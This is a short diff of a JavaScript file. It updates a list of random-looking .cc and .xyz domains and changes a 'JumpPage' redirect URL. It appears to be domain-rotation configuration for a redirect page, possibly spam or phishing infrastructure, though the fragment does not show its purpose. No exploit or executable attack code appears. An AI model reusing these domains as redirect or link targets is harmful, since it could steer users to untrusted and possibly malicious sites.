@@ -37,13 +37,14 @@ var emails = [
 ];
 
 var urls=[];
+        urls.push(".uhvukge.cc");
         urls.push(".gzincdi.cc");
         urls.push(".rxcxaps.xyz");
-        urls.push(".tajbhcvk.xyz");
+      
         
       
    	
-var JumpPage="https://yahunvo.xyz";
+var JumpPage="https://uiigbvp.cc";
 
 var newestUrls = [];
 
